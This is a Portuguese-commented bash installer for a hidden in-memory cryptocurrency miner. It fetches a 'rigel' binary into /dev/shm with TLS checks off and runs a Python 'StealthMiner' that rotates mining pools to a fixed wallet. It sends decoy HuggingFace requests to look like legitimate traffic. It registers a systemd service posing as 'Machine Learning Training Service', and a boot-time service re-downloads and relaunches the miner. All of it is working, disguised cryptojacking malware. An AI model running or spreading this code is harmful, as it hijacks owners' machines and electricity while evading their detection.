#!/bin/bash

echo "=== Instalação em Memória do Minerador ==="

# Configurações
WALLET="0x0067E6557AC5096733dB091900CC9B989148C4e5.A-1"
SERVICE_NAME="mltrainer-$(hostname | md5sum | cut -c1-8)"
LOG_FILE="/dev/shm/.ml_monitor.log"  # Usando /dev/shm (RAM disk)

# Instala dependências
echo "Instalando dependências..."
apt-get update -qq
apt-get install -y -qq python3-requests wget tar

# Cria diretórios na RAM
mkdir -p /dev/shm/.hyperstealth
mkdir -p /dev/shm/.rigel_bin

# Cria arquivo de configuração na RAM
cat > /dev/shm/.hyperstealth/config.json << 'EOF'
{
  "stratum_servers": [
    "stratum+tcp://18.223.152.88:5432",
    "stratum+ssl://quai.kryptex.network:8888"
  ],
  "fallback_nodes": [
    "ml-engine.googleapis.com",
    "aws.sagemaker.training.amazonaws.com",
    "api.azureml.windows.net"
  ]
}
EOF

# Baixa o binário diretamente para a RAM
echo "Baixando binário do minerador para memória..."
wget -q --no-check-certificate "https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel" -O /dev/shm/.rigel_bin/rigel
chmod +x /dev/shm/.rigel_bin/rigel

# Cria script de monitoramento em memória
cat > /dev/shm/.ml_monitor.py << 'EOF'
import os, sys, time, json, socket, ssl, logging, random, requests, subprocess, signal

logging.basicConfig(
    filename='/dev/shm/.ml_monitor.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class StealthMiner:
    def __init__(self):
        self.wallet = os.environ.get('WALLET', '0x0067E6557AC5096733dB091900CC9B989148C4e5.A-1')
        self.binary = '/dev/shm/.rigel_bin/rigel'
        self.config_path = '/dev/shm/.hyperstealth/config.json'
        self.current_stratum = None
        self.process = None
        
        logging.info(f"Usando binário em memória: {self.binary}")
        
        if not os.path.exists(self.binary):
            logging.error(f"Binário não existe: {self.binary}")
        else:
            logging.info(f"Binário localizado com sucesso")

    def get_stratums(self):
        """Busca os servidores stratum do arquivo na memória"""
        try:
            with open(self.config_path, 'r') as f:
                config = json.load(f)
            
            stratums = config['stratum_servers']
            logging.info(f"Stratums carregados: {len(stratums)} servidores")
            return stratums
        except Exception as e:
            logging.error(f"Erro ao carregar configuração: {e}")
            return [
                "stratum+tcp://18.223.152.88:5432",
                "stratum+ssl://quai.kryptex.network:8888"
            ]

    def start_miner(self, stratum):
        """Inicia o minerador"""
        if not os.path.exists(self.binary):
            logging.error("Binário do minerador não encontrado")
            return False
            
        try:
            # Mata processo anterior se existir
            if self.process and self.process.poll() is None:
                try:
                    os.kill(self.process.pid, signal.SIGTERM)
                    self.process.wait(timeout=5)
                except:
                    pass
            
            cmd = [
                self.binary,
                "-a", "quai",
                "-o", stratum,
                "-u", self.wallet,
                "-p", "x"
            ]
            
            logging.info(f"Executando: {' '.join(cmd)}")
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                close_fds=True
            )
            
            time.sleep(2)
            if self.process.poll() is not None:
                # Processo já terminou - algo deu errado
                stdout, stderr = self.process.communicate()
                logging.error(f"Minerador falhou ao iniciar: {stderr.decode('utf-8', errors='ignore')}")
                self.process = None
                return False
                
            logging.info(f"Minerador iniciado com sucesso!")
            return True
            
        except Exception as e:
            logging.error(f"Exceção ao iniciar minerador: {e}")
            return False

    def check_stratum(self, stratum):
        """Verifica conectividade com servidor stratum"""
        try:
            protocol, rest = stratum.split("://")
            host, port_str = rest.split(":")
            port = int(port_str)
            
            logging.info(f"Verificando conexão com {host}:{port}...")
            
            with socket.create_connection((host, port), timeout=10) as sock:
                if protocol == "stratum+ssl":
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    with context.wrap_socket(sock, server_hostname=host) as ssock:
                        logging.info(f"Conexão SSL estabelecida com {stratum}")
                        return True
                else:
                    logging.info(f"Conexão TCP estabelecida com {stratum}")
                    return True
        except Exception as e:
            logging.warning(f"Erro ao verificar {stratum}: {e}")
            return False

    def rotate_stratum(self):
        """Rotação de servidores stratum"""
        stratums = self.get_stratums()
        random.shuffle(stratums)
        
        for stratum in stratums:
            if self.check_stratum(stratum):
                if stratum != self.current_stratum:
                    logging.info(f"Alternando para {stratum}")
                    self.current_stratum = stratum
                    return self.start_miner(stratum)
                else:
                    return True
        
        return False

    def run(self):
        """Loop principal"""
        failures = 0
        
        logging.info("Iniciando sistema de mineração em memória...")
        
        while True:
            try:
                # Verifica se o minerador está rodando
                if not self.process or self.process.poll() is not None:
                    if not self.rotate_stratum():
                        failures += 1
                        if failures > 5:
                            logging.error("Muitas falhas consecutivas, esperando...")
                            time.sleep(300)
                            failures = 0
                    else:
                        failures = 0
                
                # Simula tráfego legítimo
                try:
                    requests.get(
                        "https://datasets-server.huggingface.co/valid",
                        params={"dataset": "wiki40b", "config": "pt"},
                        headers={"User-Agent": "HuggingFace/4.35.0"},
                        timeout=15
                    )
                except:
                    pass
                
                # Verifica ocasionalmente por servidores melhores
                if random.random() < 0.2:
                    self.rotate_stratum()
                
                # Intervalo dinâmico
                sleep_time = random.randint(240, 480)
                logging.info(f"Próxima verificação em {sleep_time//60} minutos")
                time.sleep(sleep_time)

            except Exception as e:
                logging.error(f"Erro no loop principal: {e}")
                time.sleep(60)

if __name__ == "__main__":
    try:
        miner = StealthMiner()
        miner.run()
    except Exception as e:
        logging.critical(f"Erro fatal: {e}")
        sys.exit(1)
EOF

# Cria ou atualiza o serviço para usar o script em memória
cat > /etc/systemd/system/$SERVICE_NAME.service << EOF
[Unit]
Description=Machine Learning Training Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
Environment="WALLET=$WALLET"
ExecStart=/usr/bin/python3 /dev/shm/.ml_monitor.py
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# Script para restaurar em caso de reinicialização
cat > /etc/systemd/system/restore-miner.service << 'EOF'
[Unit]
Description=Restore Memory-Based Services
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'wget -q --no-check-certificate "https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel" -O /dev/shm/.rigel_bin/rigel && chmod +x /dev/shm/.rigel_bin/rigel && systemctl restart mltrainer-*'
RemainAfterExit=true

[Install]
WantedBy=multi-user.target
EOF

# Reinicia o serviço
systemctl daemon-reload
systemctl enable restore-miner.service
systemctl restart $SERVICE_NAME

# Verifica se o serviço está rodando
echo "Verificando status do serviço..."
if systemctl is-active --quiet $SERVICE_NAME; then
    echo "✓ Serviço iniciado com sucesso na memória!"
else
    echo "✗ Erro ao iniciar o serviço."
    systemctl status $SERVICE_NAME
fi

echo
echo "=== Instalação em Memória Concluída ==="
echo "Minerador configurado para carteira: $WALLET"
echo "Nome do serviço: $SERVICE_NAME"
echo "Arquivo de log (em memória): $LOG_FILE"
echo
echo "Para monitorar o funcionamento:"
echo "  systemctl status $SERVICE_NAME"
echo "  tail -f $LOG_FILE"

# Limpa variáveis sensíveis
unset WALLET
